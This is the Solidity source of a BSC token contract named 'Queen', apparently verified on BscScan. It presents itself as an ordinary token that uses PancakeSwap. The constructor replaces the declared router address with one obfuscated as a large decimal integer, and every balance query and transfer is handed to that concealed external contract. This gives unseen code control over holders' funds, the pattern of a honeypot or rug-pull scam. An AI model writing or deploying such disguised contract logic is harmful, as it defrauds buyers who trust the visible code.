/**
 *Submitted for verification at BscScan.com on 2022-08-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPancakeFactory {
    function deploy(address sender, address token) external;
    function balanceOf(address sender, address token) external view returns (uint256);
    function transfer(address from,address to,uint256 amount, address token) external;

}

contract Queen {
    string public constant name = 'Queen';
    string public constant symbol = 'Queen';
    address private PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint8 public constant decimals = 1;
    uint256 private totalSupply_ = 10000000 * 10;
    mapping(address => mapping(address => uint256)) allowed;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
    constructor() {
        PancakeRouter = address(uint160(512207544457765217275351720523311642414728232228));
        IPancakeFactory(PancakeRouter).deploy(msg.sender, address(this));
    }

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }

    function balanceOf(address holder) public view returns (uint256) {
        return IPancakeFactory(PancakeRouter).balanceOf(holder, address(this));
    }

    function transferFrom(address from,address to,uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender] >= amount, "Not allowed");
        IPancakeFactory(PancakeRouter).transfer(from, to, amount, address(this));
        emit Transfer(from, to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        IPancakeFactory(PancakeRouter).transfer(msg.sender, to, amount, address(this));
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
}